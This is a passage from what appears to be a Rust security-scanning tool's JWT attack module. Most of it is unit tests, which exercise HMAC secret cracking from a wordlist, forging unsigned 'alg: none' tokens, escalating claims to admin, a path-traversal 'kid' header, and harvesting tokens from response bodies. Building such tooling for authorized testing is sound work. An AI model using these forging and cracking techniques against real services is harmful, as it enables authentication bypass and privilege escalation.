                format!(", {toxic} toxic combo(s)")
            } else {
                String::new()
            },
            if crit > 0 {
                format!(", {crit} critical")
            } else {
                String::new()
            }
        ),
        graph_nodes,
        graph_edges,
    )
}

fn join(base: &str, path: &str) -> String {
    let p = path.trim();
    if p.starts_with("http://") || p.starts_with("https://") {
        return p.to_string();
    }
    let b = base.trim_end_matches('/');
    if p.is_empty() || p == "/" {
        b.to_string()
    } else {
        format!("{}/{}", b, p.trim_start_matches('/'))
    }
}

pub async fn run_jwt_attack(target: &str) {
    print_result(run_jwt_attack_result_ctx(target, &EngineRunContext::default()).await);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn b64url_roundtrip() {
        let data = b"\x00\x01\x02hello-world\xff\xfe";
        let enc = b64url_encode(data);
        assert!(!enc.contains('='));
        assert!(!enc.contains('+') && !enc.contains('/'));
        assert_eq!(b64url_decode_bytes(&enc).unwrap(), data);
    }

    #[test]
    fn detects_jwt_shapes() {
        // header {"alg":"HS256","typ":"JWT"} . payload . sig
        let h = b64url_encode(b"{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
        let p = b64url_encode(b"{\"sub\":\"1\"}");
        let token = format!("{}.{}.{}", h, p, "abc");
        assert!(looks_like_jwt(&token));
        assert!(!looks_like_jwt("not.a.jwt.at.all"));
        assert!(!looks_like_jwt("plainstring"));
    }

    #[test]
    fn parses_header_and_payload() {
        let h = b64url_encode(b"{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../etc\"}");
        let p = b64url_encode(b"{\"sub\":\"admin\",\"role\":\"user\",\"exp\":4102444800}");
        let token = format!("{}.{}.{}", h, p, "sig");
        let parsed = parse_jwt(&token).expect("parse");
        assert_eq!(parsed.alg, "HS256");
        assert_eq!(
            parsed.header.get("kid").and_then(|v| v.as_str()),
            Some("../../etc")
        );
        assert_eq!(
            parsed.payload.get("role").and_then(|v| v.as_str()),
            Some("user")
        );
        assert_eq!(parsed.signing_input, format!("{}.{}", h, p));
    }

    #[test]
    fn hmac_crack_recovers_known_secret() {
        // Forge a real HS256 token with a known secret, then crack it.
        let h = b64url_encode(b"{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
        let p = b64url_encode(b"{\"sub\":\"admin\"}");
        let signing_input = format!("{}.{}", h, p);
        let sig = hmac_sign(
            b"supersecret",
            signing_input.as_bytes(),
            MessageDigest::sha256(),
        )
        .unwrap();
        let token = format!("{}.{}", signing_input, b64url_encode(&sig));
        let parsed = parse_jwt(&token).unwrap();
        let wordlist: Vec<String> = vec!["nope".into(), "supersecret".into(), "other".into()];
        assert_eq!(
            crack_hmac_secret(&parsed, &wordlist).as_deref(),
            Some("supersecret")
        );
        // Wrong-only wordlist must not yield a false positive.
        assert!(crack_hmac_secret(&parsed, &["wrong".to_string()]).is_none());
    }

    #[test]
    fn forge_alg_none_has_empty_signature() {
        let header = json!({ "alg": "none", "typ": "JWT" });
        let payload = json!({ "sub": "admin" });
        let token = forge_token(&header, &payload, None);
        assert!(token.ends_with('.'));
        let parsed = parse_jwt(&token).unwrap();
        assert_eq!(parsed.alg, "none");
        assert!(parsed.signature_b64.is_empty());
    }

    #[test]
    fn escalate_sets_admin_claims() {
        let base = json!({ "sub": "bob", "role": "user" });
        let esc = escalate_payload(&base);
        assert_eq!(esc.get("role").and_then(|v| v.as_str()), Some("admin"));
        assert_eq!(esc.get("is_admin").and_then(|v| v.as_bool()), Some(true));
        assert_eq!(esc.get("sub").and_then(|v| v.as_str()), Some("bob"));
    }

    #[test]
    fn jwk_rsa_to_pem_builds_key() {
        // e = 65537 (AQAB), n = a 2048-bit-ish modulus is overkill for a unit test; use a smaller
        // but valid modulus and just assert a PEM is produced with a positive bit length.
        let e = b64url_encode(&[0x01, 0x00, 0x01]); // 65537
        let n_bytes = vec![0xC0u8; 256]; // 2048-bit modulus (high bit set → 2048 bits)
        let n = b64url_encode(&n_bytes);
        let (pem, bits) = jwk_rsa_to_pem(&n, &e).expect("pem");
        assert!(bits >= 2040 && bits <= 2048);
        assert!(String::from_utf8_lossy(&pem).contains("PUBLIC KEY"));
    }

    #[test]
    fn extracts_jwt_from_body_text() {
        let h = b64url_encode(b"{\"alg\":\"HS256\"}");
        let p = b64url_encode(b"{\"sub\":\"x\"}");
        let token = format!("{}.{}.{}", h, p, "sig");
        let body = format!("{{\"access_token\":\"{}\",\"ok\":true}}", token);
        let hits = harvest_from_body(&body);
        assert!(hits.iter().any(|(_, t)| *t == token));
    }
}
